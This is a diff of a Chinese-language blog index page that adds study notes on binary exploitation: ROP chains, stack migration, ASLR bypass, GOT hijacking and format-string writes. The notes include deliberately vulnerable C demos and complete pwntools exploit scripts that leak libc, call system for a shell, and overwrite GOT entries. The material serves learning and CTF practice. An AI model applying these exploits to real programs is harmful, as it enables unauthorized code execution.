@@ -230,6 +230,288 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-简单write" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/11/25/简单write/" class="article-date">
+      <time datetime="2018-11-25T12:51:10.000Z" itemprop="datePublished">2018-11-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/25/简单write/">简单write</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <ul>
+<li>简单fmtstr</li>
+<li>绕过canary</li>
+<li>简单migration</li>
+<li>Demo和EXP可在仓库中找到<br><a href="https://github.com/Lueleng/PwnDemo" target="_blank" rel="noopener">https://github.com/Lueleng/PwnDemo</a></li>
+</ul>
+          
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+        <p class="article-more-link">
+          <a  href="/2018/11/25/简单write/#more">大航海 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-pwn-3" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/11/13/pwn-3/" class="article-date">
+      <time datetime="2018-11-13T13:15:06.000Z" itemprop="datePublished">2018-11-13</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/13/pwn-3/">pwn-3</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <!--moer-->
+<h2 id="设置objdump-Intel-格式非AT-amp-T"><a href="#设置objdump-Intel-格式非AT-amp-T" class="headerlink" title="设置objdump Intel 格式非AT&amp;T"></a>设置objdump Intel 格式非AT&amp;T</h2><ul>
+<li>alias objdump=’objdump -M intel’</li>
+</ul>
+<h2 id="找func在libc中的offset"><a href="#找func在libc中的offset" class="headerlink" title="找func在libc中的offset"></a>找func在libc中的offset</h2><h2 id="Stack-Overflow-and-ROP"><a href="#Stack-Overflow-and-ROP" class="headerlink" title="Stack Overflow and ROP"></a>Stack Overflow and ROP</h2><h3 id="Shellcode-的限制"><a href="#Shellcode-的限制" class="headerlink" title="Shellcode 的限制"></a>Shellcode 的限制</h3><ul>
+<li>Shellcode在现今大部分*86的系统上都不能直接跑。就算已经控制了程序本身也不能直接跳到shellcode上。因为有DEP，放在data buffer里的shellcode并没有可执行的权限。</li>
+<li>有部分shellcode可以执行的情况，gcc编译时要加 -z execstack参数，或者直接用vmmap开出可执行的buffer</li>
+</ul>
+<h3 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return Oriented Programming"></a>Return Oriented Programming</h3><ul>
+<li>ROP是一种利用现有的程序片段组合出想要功能的技巧。</li>
+<li>因为使用的是现存的程序，本来就可以执行，不会被DEP阻挡。但可以组出的功能也会有所限制。</li>
+<li>可以使用ROP解除DEP，再跳到shellcode执行。</li>
+</ul>
+<h3 id="Ret-Programming"><a href="#Ret-Programming" class="headerlink" title="Ret Programming"></a>Ret Programming</h3><ul>
+<li>控制ROP行为的code是[stack上排列的内容]</li>
+<li>Gadget:一小段以ret结尾的code</li>
+<li>ROP:串联gadget形成的ROP chain，组合出需要的功能    </li>
+</ul>
+<h3 id="ROP类型"><a href="#ROP类型" class="headerlink" title="ROP类型"></a>ROP类型</h3><ul>
+<li>使用register做syscall</li>
+<li>使用原程序里有点function</li>
+<li>使用libc里的gadget或function</li>
+</ul>
+<h3 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h3><ul>
+<li>execve需要字串/bin/sh,且位置要已知</li>
+<li>先用read吧需要的字串输入至已知位置的buffer上</li>
+<li>输入时如果/bin/sh后不能有其他字段可用00截断，<font color="#FF7F50"><strong>/bin/sh\x00</strong></font></li>
+<li>寻找gadget: int 0x80,ret。 ROPgadget –binary 文件名 –opcode cd80c3<h4 id="register调用read"><a href="#register调用read" class="headerlink" title="register调用read"></a>register调用read</h4></li>
+<li>eax=3 </li>
+<li>ebx=0</li>
+<li>ecx=buf_addr</li>
+<li>edx=length</li>
+<li>int0x80_ret </li>
+</ul>
+<h3 id="migration-stack"><a href="#migration-stack" class="headerlink" title="migration stack"></a>migration stack</h3><p>migration = p32(pop_ebp_ret) + p32(buf-4) + p32(pop_eax_ret) + buf + p32(gadaget1)+p32(leave_ret）</p>
+<ul>
+<li>控制好esp,使esp的值为buf,但是因为leave有pop ebp操作会导致ebp+4，所以传进去时先-4 </li>
+</ul>
+<h4 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h4><pre><code>rop1=[
+puts,     //来泄露出main_got中的地址
+pop_ebp_ret,  //要return的地址   
+libc_start_main_got, //puts要泄露的字串地址  
+gets,        //读取rop2
+pop_ebp_ret,  //要return的地址
+buf,        //将rop2读取到buf上
+pop_ebp_ret, //将ebp=buf-4
+buf-4，
+leave_ret,  //mov esp,ebp //esp=buf-4，pop esp //esp=esp+4=buf, ret //返回esp指向的位置
+]     
+r.sendline(&apos;A&apos;*offset+&apos;&apos;.join(map(p32,rop1)))
+
+rop2 =[
+gets,        //
+system,         // gets返回地址
+buf2,        // gets 写入的地方,也可当做system返回地址(无用)
+buf2         // system参数
+]
+</code></pre><h3 id="Dynamically-Linked-ELF相关操作"><a href="#Dynamically-Linked-ELF相关操作" class="headerlink" title="Dynamically Linked ELF相关操作"></a>Dynamically Linked ELF相关操作</h3><pre><code>ldd ./binary  
+得知libc的相关路径
+readelf -s/lib32/libc.so.6  检查libc里的symbol
+LD_LIBRARY_PATH=. ldd ./文件名  指定要载入的libc]
+</code></pre><h3 id="帮忙寻找libc的版本"><a href="#帮忙寻找libc的版本" class="headerlink" title="帮忙寻找libc的版本"></a>帮忙寻找libc的版本</h3><ul>
+<li><font color="#FF7F50">libcdb.com</font>
+
+</li>
+</ul>
+<h3 id="ROP-for-x86-64"><a href="#ROP-for-x86-64" class="headerlink" title="ROP for x86-64"></a>ROP for x86-64</h3><h4 id="64-bit-ROP"><a href="#64-bit-ROP" class="headerlink" title="64-bit ROP"></a>64-bit ROP</h4><ul>
+<li>syscall要用rax,rdi,rsi,rdx,rcx,r8,r9,syscall</li>
+<li>Function call 参数传递使用register<ul>
+<li>rdi,rsi,rdx,rcx,r8,r9</li>
+</ul>
+</li>
+<li>需要用<strong>pop-ret</strong>控制<strong>register</strong>,再接<strong>function address</strong>  </li>
+<li><pre><code>&lt;pop rdi; ret&gt;    
+0  
+&lt;pop rsi; ret&gt;  
+buf  
+&lt;pop rdx; ret&gt;  
+100
+&lt;read&gt;  
+... next gadget
+</code></pre></li>
+</ul>
+<h4 id="64-bit-Register"><a href="#64-bit-Register" class="headerlink" title="64-bit Register"></a>64-bit Register</h4><ul>
+<li>rax,rcx,rdx,rbx,rsp,rbp,rsi,rdi</li>
+<li>r8 - r15是用前8个加上REX prefix来表示的</li>
+<li>r12 - r15是callee saved,所以pop r12 - r15在function return前很常见</li>
+<li>pop r14 = 415e/pop rsi =5e</li>
+<li>pop r15 = 415e/pop rdi =5f</li>
+</ul>
+<h4 id="控制rdx"><a href="#控制rdx" class="headerlink" title="控制rdx"></a>控制rdx</h4><ul>
+<li>先在某个buffer上放上一个pop_rXX-ret gadget的位置,控制r13的值、r12指向gaibuffer、rdx设成0</li>
+<li>pop_rXX会情调call的return address，之后再ret下一个gadget<h4 id="控制rax"><a href="#控制rax" class="headerlink" title="控制rax"></a>控制rax</h4></li>
+<li>用函数的回赋值来控值<ul>
+<li>gets，fgets回赋buffer(rax=rdi)</li>
+<li>strcpy，strncp</li>
+<li>alarm(连续call两次alarm,第二次会ret回第一次传入的参数)<h4 id="控制rcx"><a href="#控制rcx" class="headerlink" title="控制rcx"></a>控制rcx</h4></li>
+</ul>
+</li>
+<li>很少会需要</li>
+<li>没有通用gadget</li>
+<li>通常会call function看看会对rcx造成什么样的印象<ul>
+<li>例如strcpy可能会让ecx=输入字串<h4 id="将rax写入到memory"><a href="#将rax写入到memory" class="headerlink" title="将rax写入到memory"></a>将rax写入到memory</h4></li>
+</ul>
+</li>
+<li>如果GOT可写，先填好<a href="mailto:_libc_start_main@got.plt" target="_blank" rel="noopener">_libc_start_main@got.plt</a>再跳</li>
+</ul>
+<h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><ul>
+<li><p>ROPgadget预设的搜索长度对64bit莱索不太够  </p>
+<pre><code>ROPgadget --binary ./b --depth 100
+</code></pre><h4 id="通用gadget"><a href="#通用gadget" class="headerlink" title="通用gadget"></a>通用gadget</h4></li>
+<li>64bitROP需要gadget来控制参数</li>
+<li>gcc产生的函数中有一些片段是一定会有的，可以用来做ROP，通常要够着ret2lib不是问题</li>
+<li>以gcc&gt;=4.8,久一点版本有些gadget会不太一样</li>
+</ul>
+<h3 id="De-ASLR-with-ROP"><a href="#De-ASLR-with-ROP" class="headerlink" title="De-ASLR with ROP"></a>De-ASLR with ROP</h3><ul>
+<li>Calculate Function Address without Information Leakage</li>
+</ul>
+<h4 id="在无法泄漏时算出函数位置"><a href="#在无法泄漏时算出函数位置" class="headerlink" title="在无法泄漏时算出函数位置"></a>在无法泄漏时算出函数位置</h4><ul>
+<li>实际上很多漏洞利用的情境中，是没有办法leak memory，再送第二次ROP的<ul>
+<li>EX.Web server,browser</li>
+</ul>
+</li>
+<li>Function offset 有可能已知，因为平台就那几种，libc版本可以猜</li>
+<li>在没有信息泄露的情况下，只送一次payload，算出system的address然后呼叫</li>
+</ul>
+<h4 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve?"></a>_dl_runtime_resolve?</h4><ul>
+<li>有一种ROP的技巧，是让lazy binding函数被解析时得到错误的address</li>
+<li>但有一些使用限制，RELRO保护区那开始(应该)没办法用</li>
+</ul>
+<h4 id="ROP流程"><a href="#ROP流程" class="headerlink" title="ROP流程"></a>ROP流程</h4><ul>
+<li>想办法从got.plt上捞东西出来(base)</li>
+<li>把捞出来的东西加上offset(base+offset)</li>
+<li>放回memory再call它</li>
+</ul>
+<h4 id="从got-plt上取值"><a href="#从got-plt上取值" class="headerlink" title="从got.plt上取值"></a>从got.plt上取值</h4><ul>
+<li>使用pop_rsp_r13_r14_r15_ret,暂时把stack移动到got上，用pop把值拿出来</li>
+<li>在最后ret对应的格子上，预先填好leave_ret;并在一开始就先设好rbp准备好migrated stack</li>
+<li>取出的base在r13上</li>
+<li>got.plt在FULL RELRO下是唯读的</li>
+</ul>
+<h4 id="先把base转到rbx"><a href="#先把base转到rbx" class="headerlink" title="先把base转到rbx"></a>先把base转到rbx</h4><ul>
+<li>call_libc_csu_init<ul>
+<li>基本上是个什么都不做的函数</li>
+<li>但这个函数使用了rbx,r12-r15,所以会把值push在stack上</li>
+</ul>
+</li>
+<li>对好位置接上pop rbx,就可以把原本在r13的值转移到rbx</li>
+</ul>
+<h4 id="取得base在中rbx加offset"><a href="#取得base在中rbx加offset" class="headerlink" title="取得base在中rbx加offset"></a>取得base在中rbx加offset</h4><ul>
+<li>add ebx esi； ret； = 01 f3 c3</li>
+<li>有mov cs:__bss_start,1就会有这个gadget</li>
+<li>ebx=ebx+esi(offset)</li>
+<li>再用csu_init把ebx放回memory<h4 id="补上High-4bytes-Address"><a href="#补上High-4bytes-Address" class="headerlink" title="补上High 4bytes Address"></a>补上High 4bytes Address</h4></li>
+<li>前面的做法最后只有ebx(low part)被放到memory上</li>
+<li>再重做一次，去拿base的high part<ul>
+<li>stack可以不是8byte-aligned(对齐)，歪4byte去拿gets@got的high part</li>
+<li>最后 push rbx时也要歪，这样就可以接在之前push rbx的后4byte</li>
+</ul>
+</li>
+</ul>
+<h3 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h3><ul>
+<li>(gcc demo1.c -o demo1 -fno-stack-protector -Wl,-z,relro,-z,now)</li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-pwn-2" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -257,8 +539,142 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <ul>
-<li>ldd 文件名<br>看使用了什么library</li>
+        <h2 id="Binary-Exploit"><a href="#Binary-Exploit" class="headerlink" title="Binary Exploit"></a>Binary Exploit</h2><h3 id="动态编译-daynamically"><a href="#动态编译-daynamically" class="headerlink" title="动态编译(daynamically)"></a>动态编译(daynamically)</h3><ul>
+<li>只需要x.dll文件。</li>
+<li>在程序执行需要该动态链接库的地方加载x.dll。</li>
+<li>然后获取需要的x.dll库里面的函数或数据.</li>
+</ul>
+<p><img src="https://i.imgur.com/27kwhEk.png" alt=""></p>
+<h3 id="ASLR-Protection"><a href="#ASLR-Protection" class="headerlink" title="ASLR Protection"></a>ASLR Protection</h3><ul>
+<li>Address Space Layout Randomization</li>
+<li>每次函数库载入的位置(base address)会随机化</li>
+<li>避免被猜到</li>
+<li>address = base +offset</li>
+</ul>
+<h3 id="Defeat-ASLR"><a href="#Defeat-ASLR" class="headerlink" title="Defeat ASLR"></a>Defeat ASLR</h3><ul>
+<li>Libc的base可以从很多地方推得</li>
+<li>base = address - offset</li>
+<li>利用.text内的函数来泄露资讯</li>
+<li>某些情况下的buffer overflow，或是有任意记忆体位置写入的漏洞，可以覆盖掉部分地址</li>
+<li>原本的值跟要改写的值，相差不多于0x10000可以只覆盖最低2bytes</li>
+<li>ASLR以page(4K)为单位对齐，故最底下的1.5byte值是确定的，只要赌0.5byte=1/16的几率</li>
+</ul>
+<h3 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h3><ul>
+<li>每次往前移动一个page，检查开题是否恰好是ELF的magic number，找出libc的base address</li>
+<li>根据libc里的header和hash table，找出symbol</li>
+</ul>
+<h3 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h3><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void A()&#123;</span><br><span class="line">	setvbuf(stdout,0,_IONBF,0);</span><br><span class="line">        srand(time(0)^getpid());</span><br><span class="line">        char buf[100];</span><br><span class="line">        int magic = rand();</span><br><span class="line">        gets(buf);</span><br><span class="line">        if(atoi(buf)==magic)&#123;</span><br><span class="line">                puts(&quot;OKay...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>生成运行栈溢出，32位的elf文件</li>
+<li>开启了ASLR</li>
+</ul>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>因为这次是动态编译而非静态编译，所以没有足够的gadget来组成System Call，我们选择ret回libc中的System函数</li>
+<li>但是System的地址需要我们去计算所得</li>
+<li>address=base+offset</li>
+</ul>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.首先通过<strong>ldd</strong>和<strong>readlf</strong>命令查看导入的libc库，以及该库中有哪些函数</p>
+<p><img src="https://i.imgur.com/yKgvGmL.png" alt=""></p>
+<p><img src="https://i.imgur.com/TXVpmPz.png" alt=""></p>
+<p>2.因为可以利用栈溢出所以我们先找到offset=116</p>
+<p><img src="https://i.imgur.com/mxUepVy.png" alt=""></p>
+<p>3.我们通过ret到put_plt位置并设置好栈上的数值，首先跳到put_plt,这时我们先把A_addr入栈那么他就会把A_ddr当做一会要返回的地址，然后入栈plt_gots作为put_plt第一条跳转的语句，并泄露出puts在libc中的address，那么我们只要用泄露出的puts_add减puts_offset得base</p>
+<p>4.利用base+system_offset=system_address，然后我们重新执行A函数利用rop跳转到gets函数获得第二次输入机会，并将gets函数的返回地址改为System_address，第二次输入时我们需要有一个可读并可以写的地方，因为是动态导入，那么puts函数是在运行时导入，put_got地址上的函数一定是运行时写进去然后读取跳转，那么我们就可以把这个当做写入的地址，并把次当做System的参数。另外这个时候offset已经变了但是我们可以利用slide ret来跳转。<br>5.succeed</p>
+<p><img src="https://i.imgur.com/qafDjDL.png" alt=""></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&quot;./demo1&quot;)</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">A_addr=0x804857b</span><br><span class="line">puts_plt=0x8048410</span><br><span class="line">puts_got=0x804a018</span><br><span class="line"></span><br><span class="line">puts_off=libc.symbols[&apos;puts&apos;]</span><br><span class="line">system_off=libc.symbols[&apos;system&apos;]</span><br><span class="line">gets_off=libc.symbols[&apos;gets&apos;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset=116</span><br><span class="line">payload=&quot;A&quot;*offset+p32(puts_plt)+p32(A_addr)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">#print puts_off</span><br><span class="line">#print p.recvline()</span><br><span class="line"></span><br><span class="line">base = u32(p.recvline()[:4])-puts_off</span><br><span class="line">print &apos;libc base = &apos;, hex(base)</span><br><span class="line"></span><br><span class="line">system = base + system_off</span><br><span class="line">gets = base + gets_off</span><br><span class="line">ret = 0x804861c</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload=p32(ret)*50+p32(gets)+p32(system)+p32(puts_got)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><ul>
+<li>Gadget: leave; ret;</li>
+<li>leave = mov esp,ebp; pop ebp;</li>
+</ul>
+<h3 id="Search-Specific-Symbols"><a href="#Search-Specific-Symbols" class="headerlink" title="Search Specific Symbols"></a>Search Specific Symbols</h3><ul>
+<li>在远端libc版本不明的情况下，不知道各个function的offset</li>
+<li>没有办法回推base</li>
+<li>半有办法找到特定的function</li>
+<li>解法<ul>
+<li>Dump整个libc回来</li>
+<li>仿照_dl_fixup,利用ELF header里的资讯直接找</li>
+</ul>
+</li>
+</ul>
+<h2 id="GOT-Hijacking"><a href="#GOT-Hijacking" class="headerlink" title="GOT Hijacking"></a>GOT Hijacking</h2><ul>
+<li>通常搭配<font color="#FF7F50"><strong>任意位置</strong></font>写入漏洞来使用<ul>
+<li>Format String Vulnerablity</li>
+<li>Heap Exploitation</li>
+</ul>
+</li>
+</ul>
+<h3 id="任意地址读取"><a href="#任意地址读取" class="headerlink" title="任意地址读取"></a>任意地址读取</h3><ul>
+<li>若字符串位于堆栈上，可以利用%S读取记忆体中任意位置的内容</li>
+<li>构造适当的输入，将要读取的位置作为参数传递给%s，皆可以作为字串印出目标的内容</li>
+</ul>
+<h3 id="任意地址写入"><a href="#任意地址写入" class="headerlink" title="任意地址写入"></a>任意地址写入</h3><ul>
+<li>如格式字串位于堆栈上，可以利用%n对记忆体中任意位置写入资料</li>
+<li>类似任意读取时的做法，一样可以将要写入的目标位置放在堆栈上</li>
+<li>利用%123c这样的格式字串控制输出的长度</li>
+<li>在使用%hhn可以写入一个byte到目标位置</li>
+</ul>
+<h3 id="简单formatstr"><a href="#简单formatstr" class="headerlink" title="简单formatstr"></a>简单formatstr</h3><h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h4><p><table><tr><td bgcolor="#D1EEEE"> %[parameter][flags][field width][.precision][length]type]  </td></tr></table></p>
+<ul>
+<li><strong>parameter</strong><ul>
+<li><strong>n$</strong>, 获取格式化字符串中的指定参数</li>
+</ul>
+</li>
+<li><strong>flag</strong></li>
+<li><strong>field width</strong><ul>
+<li>输出的最小宽度</li>
+</ul>
+</li>
+<li><strong>precision</strong><ul>
+<li>输出的最大长度</li>
+</ul>
+</li>
+<li><strong>length</strong> 输出的长度<ul>
+<li><strong>hh</strong>，输出一个字节</li>
+<li><strong>h</strong>，输出一个双字节 </li>
+</ul>
+</li>
+<li><strong>type</strong><ul>
+<li><strong>d/i</strong>，有符号整数</li>
+<li><strong>u</strong>，无符号整数</li>
+<li><strong>x/X</strong>，16进制的unsigned int。x使用小写字母；X使用大写字母。如果指定了精度，则输出的数字不足时左侧补0.默认精度为1.精度为0且值为0，则输出为空。</li>
+<li><strong>o</strong>，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
+<li><strong>s</strong>，如果没有用l标志，输出null结尾字符串知道精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则输出函数参数指向wchar_t型的数组，输出是把每个宽字符转化为多字节字符，相当于调用wcrtomb函数。</li>
+<li><strong>c</strong>，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>
+<li><strong>p</strong>，void*型，输出对应变量的值。printf(“%p”,a)用地址的格式打印变量a的值，printf(“%p”,&amp;a)打印变量a所在的地址。</li>
+<li><strong>n</strong>，不输出字符，但是把已经成功输出的字符个数写入对应的整形指针参数所指的变量。</li>
+<li><strong>%</strong>,’%’字面值，不接受任何flags，width<h4 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h4></li>
+</ul>
+</li>
+<li>利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。</li>
+<li>利用%s来获取变量所对应地址的内容，只不过有零截断。</li>
+<li>利用%order￥x来获取指定参数的值，利用%order￥s来获取指定参数对应地址的内容。</li>
+</ul>
+<h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int x;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	int a,b;</span><br><span class="line">	char str[100];</span><br><span class="line">	gets(str);</span><br><span class="line">	x=0;</span><br><span class="line">	printf(str);</span><br><span class="line">	printf(&quot;\n%08x&quot;,x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>步骤</p>
+<ul>
+<li>首先查看str是在gets中的第6个参数</li>
+</ul>
+<p><img src="https://i.imgur.com/oAsjZ8z.png" alt=""></p>
+<ul>
+<li>利用%n将其那面成功输出的字符个数输入到给定的地址上</li>
+<li>够照padding，将x设置为0066ABCD，利用<strong>hhn</strong>来进行单字节写入</li>
+</ul>
+<p><img src="https://i.imgur.com/h7LtMz4.png" alt=""></p>
+<ul>
+<li>把目标地址设成0x66abcd</li>
+</ul>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&quot;./demo1&quot;)</span><br><span class="line"></span><br><span class="line">x_addr=0x804a028</span><br><span class="line"></span><br><span class="line">payload=p32(x_addr)+p32(x_addr+1)+p32(x_addr+2)+p32(x_addr+3)+&apos;%189c%6$hhn&apos;+&apos;%222c%7$hhn&apos;+&apos;%187c%8$hhn&apos;</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void main()&#123;</span><br><span class="line">	setvbuf(stdout,0,_IONBF,0);</span><br><span class="line">	char str[200];</span><br><span class="line">	while(fgets(str,sizeof(str),stdin))&#123;</span><br><span class="line">		printf(str);</span><br><span class="line">	&#125;</span><br><span class="line">	exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>未开启ASLR<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3></li>
+<li>通过泄露出libc的地址找到system的真实地址</li>
+<li>修改printf_got运行跳转到system</li>
+</ul>
+<h3 id="手动寻找system和printf在libc中的位置"><a href="#手动寻找system和printf在libc中的位置" class="headerlink" title="手动寻找system和printf在libc中的位置"></a>手动寻找system和printf在libc中的位置</h3><p><img src="https://i.imgur.com/7HTtgVI.png" alt=""></p>
+<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&quot;./demo3&quot;)</span><br><span class="line">elf=ELF(&quot;./demo3&quot;)</span><br><span class="line">libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_off=libc.symbols[&quot;printf&quot;]</span><br><span class="line">system_off=libc.symbols[&quot;system&quot;]</span><br><span class="line">printf_got=0x804a00c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">payload=p32(printf_got)+&apos;%5$s&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">base=u32(p.recv()[4:8])-printf_off</span><br><span class="line"></span><br><span class="line">print &apos;base&apos;,hex(base) </span><br><span class="line">system=base+system_off</span><br><span class="line">print hex(system)</span><br><span class="line">system=0xf7e3fda0</span><br><span class="line">#payload=p32(printf_got)+p32(printf_got+1)+p32(printf_got+2)+p32(printf_got+3)+&apos;%144c%5$hhn&apos;+&apos;%93c%6$hhn&apos;+&apos;%230c%7$hhn&apos;+&apos;%20c%8$hhn&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="开启ASLR之后"><a href="#开启ASLR之后" class="headerlink" title="开启ASLR之后"></a>开启ASLR之后</h3><ul>
